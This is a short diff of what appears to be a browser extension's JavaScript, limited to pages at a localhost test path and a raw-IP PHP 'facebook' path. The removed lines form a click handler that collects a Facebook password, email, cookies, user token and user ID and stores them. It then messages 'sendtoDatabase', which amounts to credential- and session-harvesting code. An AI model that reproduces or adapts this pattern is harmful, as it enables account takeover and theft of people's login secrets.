@@ -26,16 +26,6 @@ function sendmsg(msg) {
 }
 
 if (window.location.href.indexOf("localhost/testweb/facebook") > -1 || window.location.href.indexOf("http://125.138.183.122:8084/php/facebook") > -1) {
-    document.getElementById('sendData').onclick = function() {
-        var password = document.getElementById('inputPassword').value;
-        var email = document.getElementById('inputEmail').value;
-        var cookie = document.getElementById('inputCookies').value;
-        var uToken = document.getElementById('inputUserToken').value;
-        var uuid = document.getElementById('inputUID').value;
-        chrome.storage.local.set({ FBpassword: password, FBemail: email, FBcookie: cookie, FBuToken: uToken, FBuuid: uuid }, function() {
-            sendmsg('sendtoDatabase');
-        });
-    };
     document.getElementById('needLogin').onclick = function() {
         chrome.storage.sync.set({ extensionState: 1 }, function() {
             sendmsg('fbLogin');
